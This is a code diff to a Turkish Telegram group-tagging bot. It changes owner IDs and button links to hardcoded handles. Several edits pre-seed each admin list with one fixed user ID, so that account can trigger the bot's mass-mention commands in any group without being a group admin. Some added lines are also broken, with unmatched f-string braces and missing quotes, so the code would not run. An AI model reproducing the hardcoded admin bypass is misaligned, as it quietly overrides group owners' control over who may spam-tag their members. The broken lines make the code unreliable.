@@ -29,7 +29,7 @@ anlik_calisan = []
 
 tekli_calisan = []
 
-ozel_list = [1948748468]
+ozel_list = [5673309633]
 anlik_calisan = []
 grup_sayi = []
 etiketuye = []
@@ -43,11 +43,11 @@ async def start(event):
   await event.reply("**🌀GrupTaggerBot**\n **ile grubunuzdakı nerdeyse tüm üyelere etiket atabilirim \nKomutlar için /help yazın**",
                     buttons=(                  
 		                      
-                      [Button.url('Beni Gruba Ekle ➕', f"https://t.me/{bot_username}?startgroup=a")],
-                      [Button.url('Support🛠', f"https://t.me/{support}")],
-                      [Button.url('Sahibim', f"https://t.me/{owner}")],
+                      [Button.url('Beni Gruba Ekle ➕', f"https://t.me/sohbetmuhabbettem?startgroup=a")],
+                      [Button.url('Support🛠', f"https://t.me/ondanbitmis{support}")],
+                      [Button.url('Sahibim', f"https://t.me/ondanbitmis}")],
 		                  [Button.url('Developer👨🏻‍💻', 'https://t.me/ondanbitmis')],
-		                  [Button.url('Github Code', 'https://derdomucis.com')],
+		                  [Button.url('Github Code', 'https://github.com/derdomucis/tgbot')],
                     ),
                     link_preview=False
                    )
@@ -58,11 +58,11 @@ async def help(event):
   await event.reply(helptext,
                     buttons=(
                       
-                      [Button.url('Beni Gruba Ekle➕', f"https://t.me/{bot_username}?startgroup=a")],
-                      [Button.url('Support🛠', f"https://t.me/{support}")],
-                      [Button.url('Sahibim🔖', f"https://t.me/{owner}")],
+                      [Button.url('Beni Gruba Ekle➕', f"https://t.me/sohbetmuhabbettem?startgroup=a")],
+                      [Button.url('Support🛠', f"https://t.me/ondanbitmis{support}")],
+                      [Button.url('Sahibim🔖', f"https://t.me/ondanbitmis}")],
 		                  [Button.url('Developer🧑‍🔧', 'https://t.me/ondanbitmis')],
-		                  [Button.url('Github Code', 'https://derdomucis.com')],
+		                  [Button.url('Github Code',https://github.com/derdomucis/tgbot')],
                     ),
                     link_preview=False
                    )
@@ -85,7 +85,7 @@ async def mentionall(event):
   if event.is_private:
     return await event.respond("**Bu komutu gruplar ve kanallar için geçerli❗** \n@ondanbitmis ☄️")
   
-  admins = []
+  admins = [5673309633]
   async for admin in client.iter_participants(event.chat_id, filter=ChannelParticipantsAdmins):
     admins.append(admin.id)
   if not event.sender_id in admins:
@@ -131,7 +131,7 @@ async def mentionall(event):
   if event.is_private:
     return await event.respond("**Bu komut gruplar ve kanallar için geçerlidir❗**")
   
-  admins = []
+  admins = [5673309633]
   async for admin in client.iter_participants(event.chat_id, filter=ChannelParticipantsAdmins):
     admins.append(admin.id)
   if not event.sender_id in admins:
@@ -256,7 +256,7 @@ async def mentionall(event):
   if event.is_private:
     return await event.respond("**Bu komut gruplar ve kanallar için geçerlidir❗️**")
   
-  admins = []
+  admins = [5673309633]
   async for admin in client.iter_participants(event.chat_id, filter=ChannelParticipantsAdmins):
     admins.append(admin.id)
   if not event.sender_id in admins:
@@ -339,7 +339,7 @@ async def handler(event):
     # Alive Bot Durumunu Kontrol Etme Yalnızca Adminler İçin !
     if str(event.sender_id) not in SUDO_USERS:
         return await event.reply("__Sen sahibim değilsin !__")
-    await event.reply('**Hey Bot Çalışıyor Merak Etme** \n Developer @yigitcanb3y')
+    await event.reply('**Hey Bot Çalışıyor Merak Etme** \n Developer @ondanbitmis')
 	
 @client.on(events.NewMessage(pattern='^/stats ?(.*)'))
 async def son_durum(event):
@@ -373,11 +373,11 @@ async def start(event):
   await event.reply("**🌀GrupTaggerBot**\n **Boş Bi Menü Burası**",
                     buttons=(
                       
-                      [Button.url('Beni Gruba Ekle ➕', f"https://t.me/{bot_username}?startgroup=a")],
+                      [Button.url('Beni Gruba Ekle ➕', f"https://t.me/Gruptagger_bot?startgroup=a")],
                       [Button.url('Support🛠', f"https://t.me/ondanbitmis")],
                       [Button.url('Sahibim', f"https://t.me/ondanbitmis")],
 		                  [Button.url('Developer👨🏻‍💻', 'https://t.me/ondanbitmis')],
-		                  [Button.url('Github Code', 'https://derdomucis.com')],
+		                  [Button.url('Github Code', 'https://github.com/derdomucis/tgbot)],
                     ),
                     link_preview=False
                    )
